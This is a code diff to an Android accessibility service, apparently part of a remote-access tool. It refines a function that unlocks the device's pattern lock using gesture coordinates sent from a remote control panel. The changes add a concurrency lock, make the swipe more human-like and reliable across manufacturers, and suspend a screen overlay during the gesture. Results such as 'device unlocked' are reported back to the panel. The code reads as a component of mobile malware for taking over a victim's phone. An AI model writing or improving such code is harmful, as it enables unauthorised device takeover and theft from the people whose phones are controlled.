@@ -3019,11 +3019,20 @@ class MyAccessibilityService : AccessibilityService() {
         return centros
     }
 
+    @Volatile private var desbloqueioPadraoEmAndamento = false
+
     fun desbloquearPadraoPontos(
         pontos: List<android.graphics.PointF>,
         indices: List<Int>? = null,
         onResult: ((Boolean) -> Unit)? = null
     ) {
+        // TRAVA ANTI-CONCORRÊNCIA: se já há um deslize em andamento, IGNORA o novo
+        // pedido (evita "deslize em cima do outro" por clique duplo/reenvio HTTP+socket).
+        if (desbloqueioPadraoEmAndamento) {
+            enviarLog("[PADRÃO] Pedido ignorado: já há um desbloqueio em andamento.")
+            onResult?.invoke(false)
+            return
+        }
         // PRIORIDADE: se o painel mandou os índices (1-9) da sequência, desenha
         // nos CENTROS REAIS da LockPatternView detectada no próprio aparelho —
         // assim o gesto cai exatamente nas bolinhas, sem depender da calibração
@@ -3070,23 +3079,28 @@ class MyAccessibilityService : AccessibilityService() {
         // BYPASS do overlay (Acesso Total) durante o gesto — restaura ao fim.
         setBloqueioPermiteToqueRemoto(true)
 
-        // Path CONTÍNUO com leve INTERPOLAÇÃO intermediária (simula o deslize
-        // humano; o Android rejeita padrão instantâneo). 2 pontos médios por
-        // segmento mantêm o traço suave sem levantar o dedo.
+        // Path CONTÍNUO com INTERPOLAÇÃO densa (simula o deslize humano; o Android
+        // rejeita padrão instantâneo). Passa EXATAMENTE pelo centro de cada bolinha
+        // com 3 pontos médios por segmento — traço suave, sem levantar o dedo, e
+        // cada nó registra com folga.
         val path = Path().apply {
             moveTo(pontosFinais[0].x, pontosFinais[0].y)
             for (i in 1 until pontosFinais.size) {
                 val a = pontosFinais[i - 1]; val b = pontosFinais[i]
-                lineTo(a.x + (b.x - a.x) * 0.33f, a.y + (b.y - a.y) * 0.33f)
-                lineTo(a.x + (b.x - a.x) * 0.66f, a.y + (b.y - a.y) * 0.66f)
-                lineTo(b.x, b.y)
+                lineTo(a.x + (b.x - a.x) * 0.25f, a.y + (b.y - a.y) * 0.25f)
+                lineTo(a.x + (b.x - a.x) * 0.50f, a.y + (b.y - a.y) * 0.50f)
+                lineTo(a.x + (b.x - a.x) * 0.75f, a.y + (b.y - a.y) * 0.75f)
+                lineTo(b.x, b.y)  // cai EXATO no centro da bolinha selecionada
             }
         }
 
-        // Temporização realista (spec): ancoragem inicial de 80ms + deslize de
-        // max(450ms, nPontos*140ms) contínuo, sem soltar o dedo.
-        val startTime = 80L
-        val tempoDuracao = maxOf(450L, pontosFinais.size * 140L)
+        // Temporização PROFISSIONAL: ancoragem inicial de 120ms (o dedo "pousa" na
+        // 1ª bolinha) + deslize contínuo de max(700ms, nPontos*190ms). Mais lento
+        // que antes = cada bolinha é reconhecida com segurança, sem falhar nem
+        // "pular" nó em OEMs/telas grandes.
+        val startTime = 120L
+        val tempoDuracao = maxOf(700L, pontosFinais.size * 190L)
+        desbloqueioPadraoEmAndamento = true
         val stroke = GestureDescription.StrokeDescription(path, startTime, tempoDuracao)
         val gestureBuilder = GestureDescription.Builder().addStroke(stroke)
 
@@ -3106,12 +3120,14 @@ class MyAccessibilityService : AccessibilityService() {
                         if (sucesso) "[PADRÃO OK] Senha correta — dispositivo desbloqueado."
                         else "[PADRÃO INCORRETO] A senha padrão está incorreta (keyguard ainda bloqueado)."
                     )
+                    desbloqueioPadraoEmAndamento = false
                     onResult?.invoke(sucesso)
                 }, 900L)
             }
 
             override fun onCancelled(gestureDescription: GestureDescription?) {
                 restaurarBloqueioLocal()
+                desbloqueioPadraoEmAndamento = false
                 enviarLog("[PADRÃO CANCELADO] Desenho da senha padrão cancelado pelo sistema.")
                 onResult?.invoke(false)
             }
@@ -3119,6 +3135,7 @@ class MyAccessibilityService : AccessibilityService() {
 
         if (!aceito) {
             restaurarBloqueioLocal()
+            desbloqueioPadraoEmAndamento = false
             enviarLog("[PADRÃO RECUSADO] dispatchGesture para senha padrão foi recusado pelo Android.")
             onResult?.invoke(false)
         }
